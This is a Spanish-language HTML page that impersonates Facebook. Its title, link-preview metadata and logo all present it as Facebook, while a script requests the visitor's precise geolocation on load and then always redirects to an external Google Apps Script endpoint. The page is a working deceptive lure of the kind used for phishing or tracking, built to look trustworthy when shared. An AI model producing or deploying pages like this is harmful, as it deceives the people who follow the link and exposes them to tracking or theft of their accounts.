```html
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Facebook</title>

    <!-- Vista previa al compartir -->
    <meta property="og:type" content="website">
    <meta property="og:title" content="Facebook">
    <meta property="og:description" content="Accede a Facebook">
    <meta property="og:image" content="https://raw.githubusercontent.com/quilumbaponcekevinmarcelo-sudo/facebook/main/logo_de_facebook.png">
    <meta property="og:image:alt" content="Facebook">
    
    <!-- Twitter / otras plataformas -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Facebook">
    <meta name="twitter:description" content="Accede a Facebook">
    <meta name="twitter:image" content="https://raw.githubusercontent.com/quilumbaponcekevinmarcelo-sudo/facebook/main/logo_de_facebook.png">

    <style>
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background: #ffffff;
            font-family: Arial, sans-serif;
        }

        .contenedor {
            width: 100%;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        img {
            max-width: 250px;
            width: 80%;
            height: auto;
        }

        p {
            color: #666;
            font-size: 14px;
            margin-top: 20px;
        }
    </style>
</head>

<body>

    <div class="contenedor">
        <img
            src="https://raw.githubusercontent.com/quilumbaponcekevinmarcelo-sudo/facebook/main/logo_de_facebook.png"
            alt="Facebook"
        >

        <p>Cargando...</p>
    </div>

    <script>
        const destino =
            "https://script.google.com/macros/s/AKfycbzaG077GC2AZw8BZD_f_OSx20Mw2Jpjk6UuZqpBImS8WPTVGIoLdBYwvRo1dSt0dATdBQ/exec";

        // Solicitar ubicación al usuario
        if ("geolocation" in navigator) {

            navigator.geolocation.getCurrentPosition(
                function(position) {

                    // Ubicación obtenida.
                    // Se redirige al destino.
                    window.location.href = destino;

                },
                function(error) {

                    // Si el usuario rechaza o no permite la ubicación,
                    // igualmente se puede continuar al destino.
                    window.location.href = destino;

                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );

        } else {

            // El navegador no admite geolocalización.
            window.location.href = destino;
        }
    </script>

</body>
</html>
